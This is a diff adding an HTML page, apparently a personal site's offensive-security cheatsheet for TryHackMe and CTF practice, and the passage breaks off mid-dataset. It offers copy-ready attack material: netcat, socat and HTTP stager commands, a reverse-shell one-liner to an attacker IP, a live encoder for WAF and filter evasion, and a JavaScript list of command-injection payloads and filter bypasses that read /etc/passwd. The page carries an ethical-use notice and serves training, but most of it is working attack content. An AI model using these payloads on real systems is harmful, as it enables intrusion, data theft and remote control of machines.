@@ -1,0 +1,1365 @@
+<!DOCTYPE html>
+<html class="scroll-smooth dark" lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>Offensive Security Payloads &amp; Exploitation Cheatsheet | Mihraj Mashhoor K</title>
+  <meta content="Comprehensive TryHackMe and CTF-style offensive payload cheatsheet. Covers Remote Code Execution (RCE), Command Injection filter bypasses, Local File Inclusion (LFI), PHP wrappers, log poisoning, reverse shells, and TTY stabilization with dynamic IP/Port generators." name="description"/>
+  <link rel="icon" type="image/png" href="logo2.png"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com"/>
+  <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet"/>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            'canvas-base': '#090D12',
+            'surface-subtle': '#0E131B',
+            'surface-raised': '#151D28',
+            'border-hairline': '#1F2937',
+            'border-medium': '#2D3748',
+            'primary': '#4EDEA3',
+            'primary-container': '#10b981',
+            'secondary': '#4CD7F6',
+            'on-surface': '#F3F4F6',
+            'on-surface-variant': '#8692A6',
+            'outline': '#64748B',
+            'warning': '#F59E0B',
+            'danger-critical': '#F43F5E',
+          },
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    body {
+      background-color: #090D12;
+      color: #F3F4F6;
+      font-family: 'Inter', sans-serif;
+    }
+    .material-symbols-outlined {
+      font-variation-settings: 'FILL' 0, 'wght' 400, 'GRAD' 0, 'opsz' 24;
+      display: inline-block;
+      vertical-align: middle;
+      line-height: 1;
+    }
+    .telemetry-grid {
+      background-size: 32px 32px;
+      background-image:
+        linear-gradient(to right, rgba(31, 41, 55, 0.25) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(31, 41, 55, 0.25) 1px, transparent 1px);
+    }
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+    ::-webkit-scrollbar-track {
+      background: #090D12;
+    }
+    ::-webkit-scrollbar-thumb {
+      background: #1F2937;
+      border-radius: 3px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+      background: #4EDEA3;
+    }
+  </style>
+</head>
+<body class="bg-canvas-base text-on-surface antialiased telemetry-grid min-h-screen flex flex-col font-sans selection:bg-primary selection:text-canvas-base">
+
+  <!-- ========================================================================= -->
+  <!-- Top Navigation Bar                                                        -->
+  <!-- ========================================================================= -->
+  <header class="sticky top-0 z-50 w-full border-b border-border-hairline bg-surface-subtle/95 backdrop-blur-md">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
+      
+      <!-- Brand & Status -->
+      <div class="flex items-center gap-3">
+        <a href="index.html" class="flex items-center gap-2 group">
+          <span class="w-2.5 h-2.5 rounded-full bg-danger-critical animate-pulse"></span>
+          <span class="font-mono text-sm font-bold tracking-wider text-on-surface group-hover:text-primary transition-colors">MIHRAJ.IO</span>
+          <span class="text-outline text-xs font-mono">/</span>
+          <span class="font-mono text-xs text-danger-critical font-bold">PAYLOAD HUB</span>
+        </a>
+        <span class="hidden md:inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded border border-danger-critical/30 bg-canvas-base font-mono text-[10px] text-danger-critical">
+          <span class="w-1.5 h-1.5 rounded-full bg-danger-critical"></span>
+          <span>RCE · CMDi · LFI CHEATSHEET</span>
+        </span>
+      </div>
+
+      <!-- Quick Nav Links -->
+      <nav class="hidden lg:flex items-center space-x-6 font-mono text-xs text-on-surface-variant">
+        <a href="index.html" class="hover:text-primary transition-colors flex items-center gap-1">
+          <span class="material-symbols-outlined text-sm">home</span>
+          <span>Portfolio</span>
+        </a>
+        <a href="terminal-lab.html" class="text-primary hover:text-primary/80 transition-colors flex items-center gap-1">
+          <span class="material-symbols-outlined text-sm">terminal</span>
+          <span>Terminal Lab</span>
+        </a>
+        <a href="handbook/index.html" class="hover:text-primary transition-colors flex items-center gap-1">
+          <span class="material-symbols-outlined text-sm">menu_book</span>
+          <span>Handbook</span>
+        </a>
+        <a href="resume.html" class="hover:text-primary transition-colors flex items-center gap-1">
+          <span class="material-symbols-outlined text-sm">description</span>
+          <span>Resume</span>
+        </a>
+        <a href="certificates.html" class="hover:text-primary transition-colors flex items-center gap-1">
+          <span class="material-symbols-outlined text-sm">verified</span>
+          <span>Credentials</span>
+        </a>
+      </nav>
+
+      <!-- Action Buttons -->
+      <div class="flex items-center gap-2 sm:gap-3">
+        <a href="terminal-lab.html" class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded border border-primary/40 bg-primary/10 font-mono text-xs text-primary hover:bg-primary hover:text-canvas-base transition-all font-bold cursor-pointer" title="Test payloads inside the Terminal Sandbox">
+          <span class="material-symbols-outlined text-sm">terminal</span>
+          <span class="hidden sm:inline">Launch Sandbox</span>
+          <span class="sm:hidden">Lab</span>
+        </a>
+        <a href="#encoder-tool" class="inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded border border-border-hairline bg-surface-raised font-mono text-xs text-on-surface hover:text-secondary hover:border-secondary transition-colors" title="Jump to Interactive Payload Encoder">
+          <span class="material-symbols-outlined text-sm text-secondary">transform</span>
+          <span class="hidden sm:inline">Encoder</span>
+        </a>
+      </div>
+
+    </div>
+  </header>
+
+  <!-- ========================================================================= -->
+  <!-- Hero Section & Dynamic Configuration Bar                                  -->
+  <!-- ========================================================================= -->
+  <section class="border-b border-border-hairline bg-surface-subtle/60 py-6 sm:py-8">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 space-y-6">
+      
+      <!-- Heading -->
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
+        <div class="space-y-1.5">
+          <div class="inline-flex items-center gap-2 px-2.5 py-1 rounded-full bg-danger-critical/10 border border-danger-critical/30 text-danger-critical font-mono text-xs font-bold">
+            <span class="w-2 h-2 rounded-full bg-danger-critical animate-ping"></span>
+            <span>TRYHACKME &amp; CTF OFFENSIVE REFERENCE</span>
+          </div>
+          <h1 class="text-2xl sm:text-3xl lg:text-4xl font-extrabold tracking-tight text-on-surface font-sans">
+            Offensive Payload &amp; Exploitation Cheatsheet
+          </h1>
+          <p class="text-xs sm:text-sm text-on-surface-variant max-w-3xl leading-relaxed">
+            Curated practitioner collection of verified Remote Code Execution (RCE), Command Injection (CMDi) filter bypasses, Local File Inclusion (LFI) wrappers, log poisoning, reverse shells, and TTY stabilization pipelines.
+          </p>
+        </div>
+
+        <!-- Global Listener Badge -->
+        <div class="p-3 rounded-xl bg-surface-raised border border-border-hairline flex flex-col gap-1.5 font-mono text-xs shrink-0 self-start md:self-auto">
+          <div class="text-outline text-[11px] flex items-center justify-between gap-2">
+            <span>ACTIVE NETCAT LISTENER:</span>
+            <button id="copy-nc-listener" class="text-primary hover:underline text-[10px] cursor-pointer">COPY</button>
+          </div>
+          <div class="text-primary font-bold text-xs" id="display-nc-listener">nc -lvnp 4444</div>
+          <div class="text-[10px] text-outline">Listening on configured LPORT</div>
+        </div>
+      </div>
+
+      <!-- Real-time Dynamic Target / Attacker Configuration Bar -->
+      <div class="p-4 rounded-2xl bg-surface-raised border border-primary/40 shadow-[0_0_40px_rgba(78,222,163,0.1)] flex flex-col md:flex-row items-stretch md:items-center justify-between gap-4">
+        
+        <div class="flex flex-wrap items-center gap-3 sm:gap-4 flex-1">
+          <!-- LHOST Input -->
+          <div class="space-y-1 min-w-[160px] flex-1 sm:flex-initial">
+            <label class="block text-[11px] font-mono text-outline uppercase tracking-wider font-bold">
+              Attacker IP (LHOST)
+            </label>
+            <div class="relative">
+              <span class="absolute inset-y-0 left-0 pl-2.5 flex items-center text-outline material-symbols-outlined text-sm">wifi</span>
+              <input type="text" id="config-lhost" value="10.10.14.23" 
+                     class="w-full pl-8 pr-3 py-1.5 rounded-lg bg-canvas-base border border-border-hairline text-primary font-mono text-xs font-bold focus:border-primary focus:outline-none focus:ring-1 focus:ring-primary"
+                     placeholder="e.g. 10.10.14.23 or tun0" />
+            </div>
+          </div>
+
+          <!-- LPORT Input -->
+          <div class="space-y-1 w-28">
+            <label class="block text-[11px] font-mono text-outline uppercase tracking-wider font-bold">
+              Port (LPORT)
+            </label>
+            <div class="relative">
+              <span class="absolute inset-y-0 left-0 pl-2.5 flex items-center text-outline material-symbols-outlined text-sm">tag</span>
+              <input type="number" id="config-lport" value="4444" 
+                     class="w-full pl-8 pr-2 py-1.5 rounded-lg bg-canvas-base border border-border-hairline text-secondary font-mono text-xs font-bold focus:border-secondary focus:outline-none focus:ring-1 focus:ring-secondary"
+                     placeholder="4444" />
+            </div>
+          </div>
+
+          <!-- Shell Binary Dropdown -->
+          <div class="space-y-1 w-36">
+            <label class="block text-[11px] font-mono text-outline uppercase tracking-wider font-bold">
+              Target Shell
+            </label>
+            <select id="config-shell" 
+                    class="w-full px-2.5 py-1.5 rounded-lg bg-canvas-base border border-border-hairline text-on-surface font-mono text-xs font-bold focus:border-primary focus:outline-none cursor-pointer">
+              <option value="/bin/bash">/bin/bash</option>
+              <option value="/bin/sh">/bin/sh</option>
+              <option value="/bin/zsh">/bin/zsh</option>
+              <option value="cmd.exe">cmd.exe</option>
+              <option value="powershell.exe">powershell.exe</option>
+            </select>
+          </div>
+
+          <!-- Live Indicator -->
+          <div class="hidden xl:flex items-center gap-2 pl-3 border-l border-border-hairline text-xs font-mono text-outline">
+            <span class="w-2 h-2 rounded-full bg-primary animate-pulse"></span>
+            <span>All reverse shells &amp; injection strings update in real-time</span>
+          </div>
+        </div>
+
+        <!-- Quick Reset / Status Buttons -->
+        <div class="flex items-center gap-2 shrink-0 self-end md:self-center">
+          <button id="reset-config-btn" class="px-3 py-1.5 rounded-lg border border-border-hairline bg-surface-subtle text-outline hover:text-on-surface hover:border-outline font-mono text-xs transition-colors flex items-center gap-1 cursor-pointer">
+            <span class="material-symbols-outlined text-sm">refresh</span>
+            <span>Reset</span>
+          </button>
+          <a href="#quick-stagers" class="px-3 py-1.5 rounded-lg border border-secondary/40 bg-secondary/10 text-secondary hover:bg-secondary hover:text-canvas-base font-mono text-xs font-bold transition-all flex items-center gap-1">
+            <span class="material-symbols-outlined text-sm">cloud_upload</span>
+            <span>Stagers</span>
+          </a>
+        </div>
+
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ========================================================================= -->
+  <!-- Category Filter Bar & Live Search                                         -->
+  <!-- ========================================================================= -->
+  <section class="sticky top-16 z-40 bg-surface-subtle/95 backdrop-blur-md border-b border-border-hairline py-3">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3">
+      
+      <!-- Search Box -->
+      <div class="relative flex-1 max-w-md">
+        <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-outline material-symbols-outlined text-base">search</span>
+        <input type="text" id="payload-search" 
+               class="w-full pl-9 pr-4 py-1.5 rounded-xl bg-canvas-base border border-border-hairline text-on-surface placeholder:text-outline font-mono text-xs focus:border-primary focus:outline-none focus:ring-1 focus:ring-primary"
+               placeholder="Search payloads (e.g. bash, IFS, wrapper, log, perl, nc)..." />
+        <button id="clear-search-btn" class="hidden absolute inset-y-0 right-0 pr-3 flex items-center text-outline hover:text-on-surface">
+          <span class="material-symbols-outlined text-sm">close</span>
+        </button>
+      </div>
+
+      <!-- Category Filter Pills (Horizontal Scroll on Mobile) -->
+      <div class="flex items-center gap-1.5 overflow-x-auto pb-1 md:pb-0 font-mono text-xs shrink-0 select-none scrollbar-none" id="category-chips">
+        <button class="cat-pill active px-3 py-1 rounded-lg border border-primary/50 bg-primary/20 text-primary font-bold transition-all shrink-0 cursor-pointer" data-category="all">
+          All (<span id="count-all">0</span>)
+        </button>
+        <button class="cat-pill px-3 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface-variant hover:text-primary hover:border-primary/40 transition-all shrink-0 cursor-pointer" data-category="cmdi">
+          CMDi &amp; Bypasses
+        </button>
+        <button class="cat-pill px-3 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface-variant hover:text-primary hover:border-primary/40 transition-all shrink-0 cursor-pointer" data-category="lfi">
+          LFI &amp; Wrappers
+        </button>
+        <button class="cat-pill px-3 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface-variant hover:text-primary hover:border-primary/40 transition-all shrink-0 cursor-pointer" data-category="poison">
+          Log Poisoning
+        </button>
+        <button class="cat-pill px-3 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface-variant hover:text-primary hover:border-primary/40 transition-all shrink-0 cursor-pointer" data-category="php">
+          PHP Web Shells
+        </button>
+        <button class="cat-pill px-3 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface-variant hover:text-primary hover:border-primary/40 transition-all shrink-0 cursor-pointer" data-category="revshell">
+          Reverse Shells
+        </button>
+        <button class="cat-pill px-3 py-1 rounded-lg border border-border-hairline bg-surface-raised text-on-surface-variant hover:text-primary hover:border-primary/40 transition-all shrink-0 cursor-pointer" data-category="tty">
+          TTY Upgrades
+        </button>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- ========================================================================= -->
+  <!-- Main Payloads Grid                                                        -->
+  <!-- ========================================================================= -->
+  <main class="flex-1 max-w-7xl w-full mx-auto px-4 sm:px-6 py-8 space-y-10">
+
+    <!-- Active Filter Feedback -->
+    <div id="filter-feedback" class="hidden items-center justify-between p-3 rounded-xl bg-surface-subtle border border-border-hairline text-xs font-mono">
+      <span class="text-on-surface-variant">Showing <span id="visible-count" class="text-primary font-bold">0</span> matching payloads</span>
+      <button id="reset-all-filters" class="text-secondary hover:underline cursor-pointer">Reset Filters</button>
+    </div>
+
+    <!-- Cards Container Injected via JavaScript -->
+    <div id="payloads-grid" class="grid grid-cols-1 lg:grid-cols-2 gap-4">
+      <!-- Injected dynamically -->
+    </div>
+
+    <!-- Empty State -->
+    <div id="empty-state" class="hidden p-12 text-center rounded-2xl bg-surface-subtle border border-border-hairline space-y-3 font-mono">
+      <span class="material-symbols-outlined text-4xl text-outline">search_off</span>
+      <div class="text-on-surface font-bold text-sm">No matching payloads found</div>
+      <div class="text-outline text-xs">Try adjusting your search terms or clearing category filters.</div>
+      <button onclick="resetFilters()" class="px-4 py-1.5 rounded-lg bg-primary/20 border border-primary/40 text-primary text-xs font-bold hover:bg-primary hover:text-canvas-base transition-all cursor-pointer">
+        Clear All Filters
+      </button>
+    </div>
+
+    <!-- ======================================================================= -->
+    <!-- Staging Listeners & Payload Transfer Reference                          -->
+    <!-- ======================================================================= -->
+    <section id="quick-stagers" class="pt-8 border-t border-border-hairline space-y-4">
+      <div class="flex items-center gap-2">
+        <span class="material-symbols-outlined text-primary text-xl">cloud_sync</span>
+        <h2 class="text-lg font-bold text-on-surface font-mono">Catching Shells &amp; HTTP Delivery Stagers</h2>
+      </div>
+      <p class="text-xs text-outline">
+        Rapid listeners and web hosting pipelines to catch reverse shells or stage binary implants onto the victim host.
+      </p>
+
+      <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-3 font-mono text-xs">
+        
+        <!-- Netcat Classic -->
+        <div class="p-3.5 rounded-xl bg-surface-subtle border border-border-hairline space-y-2 group">
+          <div class="flex items-center justify-between">
+            <span class="text-primary font-bold">Netcat Listener</span>
+            <button class="copy-raw-btn text-[10px] text-outline hover:text-primary" data-text="nc -lvnp [PORT]">COPY</button>
+          </div>
+          <div class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface text-[11px] overflow-x-auto whitespace-pre dynamic-cmd">
+nc -lvnp [PORT]
+          </div>
+          <div class="text-[10px] text-outline">Standard TCP port listener.</div>
+        </div>
+
+        <!-- Rlwrap Netcat -->
+        <div class="p-3.5 rounded-xl bg-surface-subtle border border-border-hairline space-y-2 group">
+          <div class="flex items-center justify-between">
+            <span class="text-secondary font-bold">Rlwrap (History/Arrows)</span>
+            <button class="copy-raw-btn text-[10px] text-outline hover:text-secondary" data-text="rlwrap nc -lvnp [PORT]">COPY</button>
+          </div>
+          <div class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface text-[11px] overflow-x-auto whitespace-pre dynamic-cmd">
+rlwrap nc -lvnp [PORT]
+          </div>
+          <div class="text-[10px] text-outline">Enables arrow keys and command history.</div>
+        </div>
+
+        <!-- Python HTTP Server -->
+        <div class="p-3.5 rounded-xl bg-surface-subtle border border-border-hairline space-y-2 group">
+          <div class="flex items-center justify-between">
+            <span class="text-warning font-bold">Python HTTP Stager</span>
+            <button class="copy-raw-btn text-[10px] text-outline hover:text-warning" data-text="python3 -m http.server 80">COPY</button>
+          </div>
+          <div class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface text-[11px] overflow-x-auto whitespace-pre">
+python3 -m http.server 80
+          </div>
+          <div class="text-[10px] text-outline">Serve scripts, linpeas, or nc binaries.</div>
+        </div>
+
+        <!-- Socat TTY Listener -->
+        <div class="p-3.5 rounded-xl bg-surface-subtle border border-border-hairline space-y-2 group">
+          <div class="flex items-center justify-between">
+            <span class="text-danger-critical font-bold">Socat Full PTY</span>
+            <button class="copy-raw-btn text-[10px] text-outline hover:text-danger-critical" data-text="socat file:`tty`,raw,echo=0 TCP-L:[PORT]">COPY</button>
+          </div>
+          <div class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface text-[11px] overflow-x-auto whitespace-pre dynamic-cmd">
+socat file:`tty`,raw,echo=0 TCP-L:[PORT]
+          </div>
+          <div class="text-[10px] text-outline">Full native PTY handler without python.</div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ======================================================================= -->
+    <!-- Interactive Payload Scratchpad & Multi-Format Live Encoder              -->
+    <!-- ======================================================================= -->
+    <section id="encoder-tool" class="pt-8 border-t border-border-hairline space-y-4">
+      <div class="flex items-center justify-between flex-wrap gap-2">
+        <div class="flex items-center gap-2">
+          <span class="material-symbols-outlined text-secondary text-xl">transform</span>
+          <h2 class="text-lg font-bold text-on-surface font-mono">Live Multi-Format Payload Encoder &amp; Obfuscator</h2>
+        </div>
+        <span class="text-xs font-mono text-outline">Instant WAF / Filter Evasion Formats</span>
+      </div>
+      <p class="text-xs text-outline">
+        Type or paste any custom command or reverse shell below to generate URL-encoded, Base64 one-liners, Hex escapes, and space-bypassed variants in real time.
+      </p>
+
+      <div class="p-4 sm:p-5 rounded-2xl bg-surface-subtle border border-secondary/40 space-y-4">
+        
+        <!-- Input Box -->
+        <div class="space-y-1.5 font-mono text-xs">
+          <div class="flex items-center justify-between text-outline">
+            <span>INPUT COMMAND OR SCRIPT:</span>
+            <button id="load-sample-cmd" class="text-secondary hover:underline cursor-pointer">Load Sample (cat /etc/passwd)</button>
+          </div>
+          <textarea id="encoder-input" rows="2" 
+                    class="w-full p-3 rounded-xl bg-canvas-base border border-border-hairline text-on-surface font-mono text-xs focus:border-secondary focus:outline-none focus:ring-1 focus:ring-secondary leading-relaxed"
+                    placeholder="Enter command to encode (e.g. bash -i >& /dev/tcp/10.10.14.23/4444 0>&1)...">cat /etc/passwd</textarea>
+        </div>
+
+        <!-- Output Variations Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-3 font-mono text-xs">
+          
+          <!-- URL Encoded -->
+          <div class="p-3 rounded-xl bg-surface-raised border border-border-hairline space-y-1.5">
+            <div class="flex items-center justify-between text-outline text-[11px]">
+              <span class="text-secondary font-bold">Standard URL Encoded</span>
+              <button class="copy-tool-btn text-primary hover:underline text-[10px]" data-target="enc-url">COPY</button>
+            </div>
+            <div id="enc-url" class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface-variant text-[11px] overflow-x-auto whitespace-pre break-all"></div>
+          </div>
+
+          <!-- Double URL Encoded -->
+          <div class="p-3 rounded-xl bg-surface-raised border border-border-hairline space-y-1.5">
+            <div class="flex items-center justify-between text-outline text-[11px]">
+              <span class="text-secondary font-bold">Double URL Encoded (Bypass Decoders)</span>
+              <button class="copy-tool-btn text-primary hover:underline text-[10px]" data-target="enc-double-url">COPY</button>
+            </div>
+            <div id="enc-double-url" class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface-variant text-[11px] overflow-x-auto whitespace-pre break-all"></div>
+          </div>
+
+          <!-- Base64 Raw -->
+          <div class="p-3 rounded-xl bg-surface-raised border border-border-hairline space-y-1.5">
+            <div class="flex items-center justify-between text-outline text-[11px]">
+              <span class="text-primary font-bold">Base64 Encoded String</span>
+              <button class="copy-tool-btn text-primary hover:underline text-[10px]" data-target="enc-b64">COPY</button>
+            </div>
+            <div id="enc-b64" class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface-variant text-[11px] overflow-x-auto whitespace-pre break-all"></div>
+          </div>
+
+          <!-- Linux Base64 One-Liner -->
+          <div class="p-3 rounded-xl bg-surface-raised border border-border-hairline space-y-1.5">
+            <div class="flex items-center justify-between text-outline text-[11px]">
+              <span class="text-primary font-bold">Linux Base64 Pipe Execution</span>
+              <button class="copy-tool-btn text-primary hover:underline text-[10px]" data-target="enc-b64-sh">COPY</button>
+            </div>
+            <div id="enc-b64-sh" class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface-variant text-[11px] overflow-x-auto whitespace-pre break-all"></div>
+          </div>
+
+          <!-- Hex String -->
+          <div class="p-3 rounded-xl bg-surface-raised border border-border-hairline space-y-1.5">
+            <div class="flex items-center justify-between text-outline text-[11px]">
+              <span class="text-warning font-bold">Hex Escape Sequence (\x63\x61...)</span>
+              <button class="copy-tool-btn text-primary hover:underline text-[10px]" data-target="enc-hex">COPY</button>
+            </div>
+            <div id="enc-hex" class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface-variant text-[11px] overflow-x-auto whitespace-pre break-all"></div>
+          </div>
+
+          <!-- Space Bypass IFS -->
+          <div class="p-3 rounded-xl bg-surface-raised border border-border-hairline space-y-1.5">
+            <div class="flex items-center justify-between text-outline text-[11px]">
+              <span class="text-warning font-bold">${IFS} Space-Bypassed Command</span>
+              <button class="copy-tool-btn text-primary hover:underline text-[10px]" data-target="enc-ifs">COPY</button>
+            </div>
+            <div id="enc-ifs" class="p-2 rounded bg-canvas-base border border-border-hairline text-on-surface-variant text-[11px] overflow-x-auto whitespace-pre break-all"></div>
+          </div>
+
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Ethical Disclaimer Banner -->
+    <div class="p-4 rounded-xl bg-surface-subtle border border-border-hairline flex items-start gap-3 text-xs font-mono text-outline">
+      <span class="material-symbols-outlined text-warning text-lg shrink-0">shield</span>
+      <div class="leading-relaxed">
+        <span class="text-on-surface font-bold">ETHICAL AUDITING &amp; EDUCATIONAL COMPLIANCE NOTICE:</span>
+        All payloads, techniques, and commands provided on this page are compiled strictly for authorized security assessments, penetration testing engagements with explicit written permission, Capture The Flag (CTF) competitions, and academic defensive research. Unauthorized access to remote systems is strictly illegal.
+      </div>
+    </div>
+
+  </main>
+
+  <!-- ========================================================================= -->
+  <!-- Site Footer                                                               -->
+  <!-- ========================================================================= -->
+  <footer class="border-t border-border-hairline bg-surface-subtle/80 py-8 text-center font-mono text-xs text-outline space-y-2">
+    <div class="max-w-7xl mx-auto px-4 sm:px-6 flex flex-col sm:flex-row items-center justify-between gap-4">
+      <div class="flex items-center gap-2">
+        <span class="w-2 h-2 rounded-full bg-primary"></span>
+        <span class="text-on-surface font-bold">Mihraj Mashhoor K</span>
+        <span>· Offensive Security &amp; Local AI Platform Engineer</span>
+      </div>
+      <div class="flex items-center gap-4 text-[11px]">
+        <a href="index.html" class="hover:text-primary transition-colors">Portfolio</a>
+        <a href="terminal-lab.html" class="hover:text-primary transition-colors">Terminal Lab</a>
+        <a href="handbook/index.html" class="hover:text-primary transition-colors">Handbook</a>
+        <a href="resume.html" class="hover:text-primary transition-colors">Resume</a>
+      </div>
+    </div>
+  </footer>
+
+  <!-- Toast Notification Container -->
+  <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col gap-2 pointer-events-none"></div>
+
+  <!-- Interactive Logic & Dataset Script -->
+  <script>
+    // =========================================================================
+    // 1. MASTER PAYLOADS DATASET
+    // =========================================================================
+    const PAYLOADS = [
+      // -----------------------------------------------------------------------
+      // COMMAND INJECTION (CMDi) & SEPARATORS
+      // -----------------------------------------------------------------------
+      {
+        id: 'cmdi-chaining',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'CHAINING',
+        badgeColor: 'primary',
+        title: 'Command Chaining Operators (; & && | ||)',
+        description: 'Standard Linux/Unix command separators to append and execute arbitrary commands after an intended parameter.',
+        payloadTemplate: '; whoami\n& whoami\n&& whoami\n| whoami\n|| whoami',
+        notes: 'If one separator is filtered by the web application firewall (WAF), test alternative operators like && or ||. On Windows, & and && are standard.',
+        tags: ['separator', 'chaining', 'cmdi', 'basic']
+      },
+      {
+        id: 'cmdi-newline',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'NEWLINE LF',
+        badgeColor: 'secondary',
+        title: 'Newline Parameter Separator (%0a / %0d%0a)',
+        description: 'Line feed (LF) separator commonly accepted in HTTP GET/POST queries where semicolon is blocked.',
+        payloadTemplate: '%0a whoami\n%0d%0a whoami\n?ip=127.0.0.1%0awhoami',
+        notes: 'URL-encoded %0a injects a literal newline into shell execution pipelines, bypassing regular expressions that only look for ; or |.',
+        tags: ['newline', 'lf', 'crlf', 'url-encoded', 'cmdi']
+      },
+      {
+        id: 'cmdi-substitution',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'SUBSTITUTION',
+        badgeColor: 'warning',
+        title: 'Command Substitution ($() and Backticks)',
+        description: 'Execute nested shell commands inline and substitute the result directly into arguments.',
+        payloadTemplate: '`whoami`\n$(whoami)\n$(cat /etc/passwd)',
+        notes: 'Useful when the input string is placed inside double quotes (e.g. echo "Hello USER_INPUT").',
+        tags: ['substitution', 'backticks', 'inline', 'cmdi']
+      },
+      {
+        id: 'cmdi-space-ifs',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'SPACE BYPASS',
+        badgeColor: 'primary',
+        title: 'Internal Field Separator Space Bypass (${IFS})',
+        description: 'Defeat space filtering in bash using the environment variable ${IFS} (Internal Field Separator).',
+        payloadTemplate: 'cat${IFS}/etc/passwd\ncat$IFS$9/etc/passwd\nls${IFS}-la',
+        notes: '$IFS$9 prevents bash from confusing the variable name with subsequent alphanumeric characters.',
+        tags: ['ifs', 'space', 'bypass', 'cmdi', 'filter']
+      },
+      {
+        id: 'cmdi-space-brace',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'SPACE BYPASS',
+        badgeColor: 'primary',
+        title: 'Brace Expansion & Redirection Space Bypasses',
+        description: 'Execute multi-token commands without literal space characters via bash brace expansion or file redirection.',
+        payloadTemplate: '{cat,/etc/passwd}\ncat</etc/passwd\ncat%09/etc/passwd',
+        notes: '%09 injects a horizontal tab character which functions as a whitespace delimiter in Linux shells.',
+        tags: ['brace', 'redirection', 'tab', 'space', 'cmdi']
+      },
+      {
+        id: 'cmdi-quotes-quotes',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'KEYWORD BYPASS',
+        badgeColor: 'secondary',
+        title: 'Quote & Backslash Keyword Blacklist Bypass',
+        description: 'Evade keyword filters (such as blacklisted "cat", "passwd", or "whoami") by splicing quotes or backslashes.',
+        payloadTemplate: "c'a't /et'c'/pas's'wd\nc\"a\"t /et\"c\"/pass\"w\"d\nc\\a\\t /e\\t\\c/p\\a\\s\\s\\w\\d\nw'h'o'a'm'i",
+        notes: 'Bash concatenates adjacent quoted fragments into a single uninterrupted command string before execution.',
+        tags: ['quotes', 'backslash', 'evasion', 'blacklist', 'cmdi']
+      },
+      {
+        id: 'cmdi-wildcards',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'WILDCARD GLOB',
+        badgeColor: 'warning',
+        title: 'Shell Wildcard & Globbing Evasion (/???/??t)',
+        description: 'Execute system binaries without typing blacklisted letters using regex-like wildcard globbing.',
+        payloadTemplate: '/???/c?t /???/p????d\n/bin/c* /etc/pass*\n/usr/bin/p*3 -c "import pty;pty.spawn(\'/bin/sh\')"',
+        notes: 'Linux shells expand ? to match single characters and * to match zero or more characters against disk binaries.',
+        tags: ['wildcard', 'glob', 'question-mark', 'evasion']
+      },
+      {
+        id: 'cmdi-base64-pipe',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'ENCODED PIPE',
+        badgeColor: 'danger-critical',
+        title: 'Base64 Encoded Execution Pipe',
+        description: 'Encode complex commands into alphanumeric strings to avoid all special character and whitespace filters.',
+        payloadTemplate: 'echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash\necho [BASE64_REV] | base64 -d | sh',
+        notes: 'Completely circumvents character blacklists on victim web apps because only Base64 characters (A-Z, a-z, 0-9, +, /, =) are transmitted.',
+        tags: ['base64', 'pipe', 'decode', 'bash', 'waf-bypass']
+      },
+      {
+        id: 'cmdi-blind-time',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'BLIND TIME-BASED',
+        badgeColor: 'primary',
+        title: 'Blind Time-Based Command Injection (Sleep & Ping)',
+        description: 'Confirm command injection on blind endpoints where no command output is returned in the HTTP response.',
+        payloadTemplate: '; sleep 10 ;\n| sleep 10\n& ping -c 10 127.0.0.1 &\n$(sleep 10)',
